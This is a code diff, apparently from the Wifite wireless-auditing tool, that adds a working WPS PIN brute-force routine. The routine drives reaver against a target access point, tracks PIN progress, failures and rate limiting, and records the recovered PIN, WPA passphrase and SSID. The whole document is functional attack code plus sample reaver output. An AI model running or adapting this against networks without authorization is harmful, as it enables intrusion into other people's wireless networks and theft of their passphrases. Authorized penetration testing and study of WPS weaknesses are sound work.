@@ -162,6 +162,111 @@ class AttackWPS(Attack):
         return False
 
 
+    def run_wps_pin_attack(self):
+        # Write reaver stdout to file.
+        self.stdout_file = Configuration.temp('reaver.out')
+        if os.path.exists(self.stdout_file):
+            os.remove(self.stdout_file)
+        stdout_write = open(self.stdout_file, 'a')
+
+        # Start reaver process
+        command = [
+            'reaver',
+            '-i', Configuration.interface,
+            '-b', self.target.bssid,
+            '-c', self.target.channel,
+            '-a', # Automatically restart session
+            '-v'  # verbose
+        ]
+        reaver = Process(command, stdout=stdout_write, stderr=Process.devnull())
+
+        self.success = False
+        pin_current = 0
+        pin_total = 11000
+        failures = 0
+        state = 'initializing'
+
+        while True:
+            time.sleep(1)
+            Color.clear_line()
+            Color.p('\r{+} {C}WPS PIN attack{W} ')
+            Color.p('({G}%d{W}/{G}%d{W}, ' % (pin_current, pin_total))
+            Color.p('{R}%d/%d failed{W}) ' % (failures, \
+                                            Configuration.wps_fail_threshold))
+
+            # Get output
+            out = self.get_stdout()
+
+            # Clear output file
+            f = open(self.stdout_file, 'w')
+            f.write('')
+            f.close()
+
+            (pin, psk, ssid) = AttackWPS.get_pin_psk_ssid(out)
+            if pin and psk and ssid:
+                # We cracked it.
+                self.success = True
+                self.crack_result = CrackResultWPS(self.target.bssid, ssid, pin, psk)
+                self.crack_result.dump()
+                break
+            # Look for progress
+            match = None
+            for match in re.finditer('Pin count advanced: (\d+)\\. Max pin attempts: (\d+)', out):
+                pass
+            if match:
+                groups = match.groups()
+                pin_current = int(groups[0])
+                pin_total = int(groups[1])
+                failures = 0
+
+            # Failures
+            failures += out.count('WPS transaction failed')
+
+            # Status
+            if 'Waiting for beacon from'   in out: state = '{O}waiting for beacon{W}'
+            if 'Starting Cracking Session' in out: state = '{C}cracking{W}'
+            if 'Detected AP rate limiting' in out:
+                state = '{R}rate-limited{W}'
+                if not Configuration.wps_skip_rate_limit:
+                    Color.pl(state)
+                    Color.pl('{!} {R}hit rate limit, stopping{W}\n')
+                    break
+
+            match = re.search('Estimated Remaining time: ([a-zA-Z0-9]+)', out)
+            if match:
+                eta = match.groups()[0]
+                state = '{C}cracking, ETA: {G}%s{W}' % eta
+
+            # Check if process is still running
+            if reaver.pid.poll() != None:
+                Color.pl('{R}failed{W}')
+                Color.pl('{!} {R}reaver{O} quit unexpectedly{W}')
+                self.success = False
+                break
+
+            # Output the current state
+            Color.p(state)
+
+            '''
+            [+] Waiting for beacon from AA:BB:CC:DD:EE:FF
+            [+] Associated with AA:BB:CC:DD:EE:FF (ESSID: <essid here>)
+            [+] Starting Cracking Session. Pin count: 0, Max pin attempts: 11000
+            [+] Trying pin 12345670.
+            [+] Pin count advanced: 46. Max pin attempts: 11000
+            [!] WPS transaction failed (code: 0x02), re-trying last pin
+            [!] WPS transaction failed (code: 0x03), re-trying last pin
+            [!] WARNING: Failed to associate with 00:24:7B:AB:5C:EE (ESSID: myqwest0445)
+            [!] WARNING: Detected AP rate limiting, waiting 60 seconds before re-checking
+            [!] WARNING: 25 successive start failures
+            [+] 0.55% complete. Elapsed time: 0d0h2m21s.
+            [+] Estimated Remaining time: 0d15h11m35s
+            '''
+
+        reaver.interrupt()
+
+        return self.success
+
+
     @staticmethod
     def get_pin_psk_ssid(stdout):
         ''' Parses WPS PIN, PSK, and SSID from output '''
@@ -188,11 +293,6 @@ class AttackWPS(Attack):
             ssid = regex.groups()[0]
 
         return (pin, psk, ssid)
-
-
-    def run_wps_pin_attack(self):
-        # TODO Implement
-        return False
 
     def get_stdout(self):
         ''' Gets output from stdout_file '''
